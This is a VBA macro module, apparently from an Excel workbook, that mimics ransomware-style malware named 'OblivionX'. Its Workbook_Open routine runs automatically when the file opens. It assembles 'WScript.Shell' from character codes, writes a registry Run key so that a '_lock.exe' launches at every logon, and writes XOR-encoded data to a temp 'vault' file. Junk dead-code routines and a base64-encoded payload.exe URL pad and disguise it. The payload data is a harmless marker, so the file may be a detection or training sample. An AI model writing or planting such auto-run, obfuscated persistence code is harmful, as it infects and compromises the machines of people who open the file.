
Public Sub OblivionXJunkRoutine()
    Dim junkcounter As Long
    Dim junktext As String
    If False Then
        junktext = "decoy"
        junkcounter = 1 + 1
    End If
    Dim deadvarunused As Long
    If 1 = 2 Then
        deadvarunused = 999
    End If

End Sub
Attribute VB_Name = "ThisWorkbook"
Private Sub Workbook_Open()
    Dim jybosg1pnivrj As Object
    Dim lps4wdhm As String, data As String, enc As String
    Dim sbospdtkrqzns As Long
    Set jybosg1pnivrj = CreateObject("WScr" & Chr(105) & Chr(112) & Chr(116) & Chr(46) & Chr(83) & Chr(104) & "ell")
    jybosg1pnivrj.RegWrite "HKCU" & "\Sof" & "tware\M" & "icro" & "soft\Wi" & "ndow" & "s\Cur" & "rentVersi" & "on\Run" & "\oblivi" & "onx", """ & Environ("TEMP") & "\oblivion" & "x_lock.e" & "xe"", "REG_SZ"
    lps4wdhm = Environ("TEMP") & "\obl" & "ivionx_" & "vaul" & "t\sec" & "ret." & "txt"
    data = "top secr" & "et mark" & "er data"
    enc = ""
    For sbospdtkrqzns = 1 To Len(data)
        enc = enc & Chr(Asc(Mid(data, sbospdtkrqzns, 1)) Xor 42)
    Next sbospdtkrqzns
    Open lps4wdhm For Output As #1
    Print #1, enc
    Close #1
End Sub

Public Function OblivionXDecoy() As String
    Dim b64 As String
    b64 = "aHR0cDovLzEyNy4wLjAuMTo5MDkwL3BheWxvYWQuZXhl"
    OblivionXDecoy = b64
End Function
